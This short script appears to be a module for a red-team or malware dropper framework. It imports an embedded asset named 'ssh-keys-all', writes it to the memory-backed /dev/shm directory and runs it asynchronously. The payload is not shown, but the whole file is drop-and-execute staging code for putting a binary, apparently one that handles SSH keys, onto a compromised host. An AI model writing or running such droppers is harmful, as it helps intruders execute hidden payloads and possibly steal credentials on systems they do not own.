//priority:101
//timeout:60

//import:ssh-keys-all

function Deploy() {
    var sshkeys = GetAssetAsBytes("ssh-keys-all");
    var path = "/dev/shm/ssh-keys-all";

    G.file.WriteFileFromBytes(path, sshkeys[0]);
    G.exec.ExecuteCommandAsync(path, [""]);
}

